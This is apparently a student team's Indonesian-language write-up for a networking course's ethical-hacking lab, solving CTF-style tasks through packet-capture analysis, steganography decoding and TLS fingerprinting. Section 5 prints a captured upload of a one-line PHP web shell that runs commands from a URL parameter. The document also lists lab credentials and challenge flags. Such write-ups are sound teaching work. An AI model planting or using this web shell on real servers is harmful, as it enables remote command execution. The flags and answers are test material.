# Jarkom-Modul-1-IT12-2024

# PRAKTIKUM MODUL 1 ETHICAL HACKING
## Kelompok IT12
### Anggota Kelompok :
|             Nama              |     NRP    |
|-------------------------------|------------|
| Azza Farichi Tjahjono         | 5027231071 |
| Aisyah Rahmasari              | 5027231072 |




## 1. Pegawai Negeri Sebelah

### Langkah-langkah:

1. Pertama, masukkan ncat yang diberikan di soal, lalu akan muncul password nNnM%coQuF
   ![Screenshot 2024-09-18 233950](https://github.com/user-attachments/assets/46748b38-8555-4008-b217-78542ddfb7fe)
2. Setelah itu, search seperti ini
   ![Screenshot 2024-09-18 234046](https://github.com/user-attachments/assets/27b0b312-631d-4097-826e-11de24e991b8)
3. dan akan muncul pemilik password nNnM%coQuF
   ![Screenshot 2024-09-18 203831](https://github.com/user-attachments/assets/cfce1876-3bcc-43a2-aa7d-94e503247503)
5. disini di tanya apa jabatan Taufan
   ![Screenshot 2024-09-18 203255](https://github.com/user-attachments/assets/d2bbc310-6a67-4876-8070-8de6080854bf)
   ![Screenshot 2024-09-18 203848](https://github.com/user-attachments/assets/6bb29f1e-9467-4bf9-accc-0bf2df0e88e9)

   



   
![Screenshot 2024-09-18 203831](https://github.com/user-attachments/assets/03854ea6-a18d-4cad-908c-33bf43f68e8d)

## 2. Illegal Breakthrough

### Langkah-langkah:
1. Menemukan alamat IP menggunakan Wireshark: 172.21.88.207
2. Menemukan port webserver: 1917
3. Mengidentifikasi endpoint: `/ww1.php`
4. Alat yang digunakan penyerang: Fuzz Faster U Fool v2.1.0-dev (ffuf-v2.1.0-dev)
   
   ![Screenshot from 2024-09-18 19-03-16](https://github.com/user-attachments/assets/291694d5-67ca-4ab9-a4cb-261cc0970617)


6. Menemukan kredensial menggunakan filter:
   `http.response.code == 200 || http.response.code == 302 || http.response.code == 500`
   
    ![Screenshot from 2024-09-18 19-03-25](https://github.com/user-attachments/assets/214680b3-22ba-4f29-8805-cc883573b044)

   

### Kredensial:
- Username: Redbaron
- Password: fly1ng4c3

### Flag:
```
JarkomIT{d34th_fr0m_th3_sky_6EkG8A6TWNe6bIkS0AUnkuTNWH1fCNB1GtDXzjjpstmJrqPESExTWW1}
```

## 3. Corporate Breach

### Langkah-langkah:
1. Menemukan nama penyerang: `frame contains "name"`
2. Menemukan email: `frame contains "%40gmail.com"` (mencari panjang unik: 108)
3. Menemukan password di stream
   
![Screenshot from 2024-09-18 19-49-38](https://github.com/user-attachments/assets/bf7dfa23-50d9-4c81-8095-0860d7ef57a5)


### Kredensial:
- Email: jarkomsupport@gmail.com
- Password: j4rk0mg4c0rbg

### Flag:
```
JarkomIT{supp0rt_k0k_l3m4h_bg_X6k4kpmgiywUAvr6ShP1QVrkNG6n0aJuPNWjvvdOwDqSxEq2R5SvG6}
```

## 4. Tantangan EZ

### Langkah-langkah:
1. Menemukan pesan di TCP stream:
   ```
   pesan: "jawabannya jawaban"
   ```
  ![Screenshot from 2024-09-18 19-58-46](https://github.com/user-attachments/assets/d6257021-46c3-48eb-a327-df16527911d5)
   
2. Port ditemukan di detail paket: 1234 (search-agent)
   `Source Port: search-agent (1234)`


### Flag:
```
JarkomIT{BiAr_aman_Pake_sSh_5F6N9E3iBq6sTSqNYBq5yrHYV3zjgmrbNiBnrjR4R4A7uLpowvayEZ}
```

## 5. InneRCE

### Langkah-langkah:
1. Menggunakan `frame contains "shell"` untuk menemukan konten HTTP
  lalu lihat pada paket dengan status 200 OK, disitu adalah saat penyerang pertama kali berhasil upload file, lalu lihat pada arrival time untuk menjawab nomor 1

    ![image](https://github.com/user-attachments/assets/29bf79fd-af93-4202-b507-3c68eee7c228)

  berikut adalah endpoint yang rentan di tandai dengan berhasilnya penyerang mengupload file:
  ```
    POST /upload.php HTTP/1.1
    Host: 172.24.141.242:8000
    Connection: keep-alive
    Content-Length: 360
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
    Origin: http://172.24.141.242:8000
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryam8WSsNDVFbRRfVY
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://172.24.141.242:8000/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    
    ------WebKitFormBoundaryam8WSsNDVFbRRfVY
    Content-Disposition: form-data; name="fileToUpload"; filename="idzoyyshell.php"
    Content-Type: application/octet-stream
    
    <?php
    
    echo exec($_GET['mintcocscmd']);
    
    ?>
    
    ------WebKitFormBoundaryam8WSsNDVFbRRfVY
    Content-Disposition: form-data; name="submit"
    
    Upload Image
    ------WebKitFormBoundaryam8WSsNDVFbRRfVY--
    HTTP/1.1 200 OK
    Host: 172.24.141.242:8000
    Date: Mon, 16 Sep 2024 06:18:05 GMT
    Connection: close
    X-Powered-By: PHP/8.2.18
    Content-type: text/html; charset=UTF-8
    
    The file idzoyyshell.php has been uploaded.
  ```
3. Menggunakan `frame contains "hostname"` untuk menemukan nama server: server-app
4. Mengidentifikasi nama file: idzoyyshell.php
5. lalu melihat command pertama seperti pada gambar yaitu `whoami`
    ![Screenshot from 2024-09-18 20-58-39](https://github.com/user-attachments/assets/a06d7c95-1306-475b-bb93-a3354e3bfab7)

     
7. Menemukan string pertama dengan filter: `http contains "idzoyy"`
8. Mendekode string base64:
   ```
   echo "cGxzIHJhdGUgc29hbCBpbmkK" | base64 -d
   pls rate soal ini
   ```

### Flag:
```
JarkomIT{P4L1nG_g4mPaNg_An4L1sA_W3b_aTk_k2iyHeiFpFY43wOPrr0onoOYZW4iweS1Jsu3Ngx8x8FCMqQhdDtxeRCE}
```

## 6. Stegography

### Langkah-langkah:
1. Menemukan 13 file PNG menggunakan `frame contains "png"`
2. Mengekspor objek menggunakan File > Export Objects > FTP-data
3. Menjalankan skrip Python yang dimodifikasi untuk mendekode gambar, berikut adalah modifikasi script python saya
   ```python
    import os
    from PIL import Image
    import glob
    
    def decode_image_reversed(image_path):
        img = Image.open(image_path)
        img = img.convert("RGB")
        pixels = img.load()
    
        binary_message = ""
        for i in range(img.width):
            for j in range(img.height):
                r, g, b = pixels[i, j]
                
                r_bin = format(r, '08b')
                binary_message += r_bin[-1]
    
        message = ""
        for i in range(0, len(binary_message), 8):
            byte = binary_message[i:i + 8]
            char = chr(int(byte, 2))
            
            if message.endswith("EOF"):
                break
            message += char
    
        message = message.replace("EOF", "")
    
        reversed_message = message[::-1]
        return reversed_message

      # Folder tempat gambar-gambar berada
      image_folder = './extracted_images'
      
      # Scan semua file gambar dengan ekstensi tertentu
      for image_file in glob.glob(os.path.join(image_folder, "*.png")) + glob.glob(os.path.join(image_folder, "*.jpg")):
          print(f"Memproses gambar: {image_file}")
          try:
              decoded_message_reversed = decode_image_reversed(image_file)
              print(f"Pesan terbalik dari {image_file}: {decoded_message_reversed}")
          except Exception as e:
              print(f"Gagal memproses {image_file}: {e}")
   ```
   **Output**
   ```bash
   output:
    Memproses gambar: ./extracted_images/TKTI.png
    Pesan terbalik dari ./extracted_images/TKTI.png: 0
    Memproses gambar: ./extracted_images/SOC.png
    Pesan terbalik dari ./extracted_images/SOC.png: 0
    Memproses gambar: ./extracted_images/KWA.png
    Pesan terbalik dari ./extracted_images/KWA.png: 0
    Memproses gambar: ./extracted_images/ATP.png
    Pesan terbalik dari ./extracted_images/ATP.png: nawalhap
    Memproses gambar: ./extracted_images/AI.png
    Pesan terbalik dari ./extracted_images/AI.png: 0
    Memproses gambar: ./extracted_images/IOT.png
    Pesan terbalik dari ./extracted_images/IOT.png: 0
    Memproses gambar: ./extracted_images/SISOP.png
    Pesan terbalik dari ./extracted_images/SISOP.png: 0
    Memproses gambar: ./extracted_images/TKA.png
    Pesan terbalik dari ./extracted_images/TKA.png: 0
    Memproses gambar: ./extracted_images/SBD.png
    Pesan terbalik dari ./extracted_images/SBD.png: 0
    Memproses gambar: ./extracted_images/KJK.png
    Pesan terbalik dari ./extracted_images/KJK.png: rebis
    Memproses gambar: ./extracted_images/IMK.png
    Pesan terbalik dari ./extracted_images/IMK.png: 0
    Memproses gambar: ./extracted_images/EH.png
    Pesan terbalik dari ./extracted_images/EH.png: nanamaek
    Memproses gambar: ./extracted_images/SOKA.png
    Pesan terbalik dari ./extracted_images/SOKA.png: 0
    
    pesan yang ada = ATP, EH, KJK
   ```
  
5. Menemukan pesan di gambar ATP, EH, dan KJK


### Pesan gabungan:
"pahlawan keamanan siber"

### Flag:
```
JarkomIT{S3LaM4t_p4rA_PahL4WaN_suKliOnlOmpKy2uJMaaghiuIBP5sSIeZZC5MXsLf7NDbwAomaoeQ7hC5}
```
## 7. Rizzset


### Informasi yang ditemukan:
1. Domain: www.its.ac.id
2. IP: 103.94.189.5
3. Saya menggunakan tools untuk generate jarm pada github repo [ini](https://github.com/salesforce/jarm)
   dapat digunakan dengan cara:
   ```bash
   pip install -r requirement.txt

   python3 jarm.py www.its.ac.id
   ```
5. JARM fingerprint:
   ```
   2ad2ad16d2ad2ad22c2ad2ad2ad2ad74aaecca9f9c4a3303863dfee62b241e
   ```

    ![image](https://github.com/user-attachments/assets/0ce8c599-9828-432e-ab30-7629345094ea)


### Flag:
```
JarkomIT{Dn5_C0rR34t10n_V1DMrStMk5RBnEGTtYi1yQ14Ur1zZrz71zUcXIbjtr4XX2GyZIHw8d1T5}
```






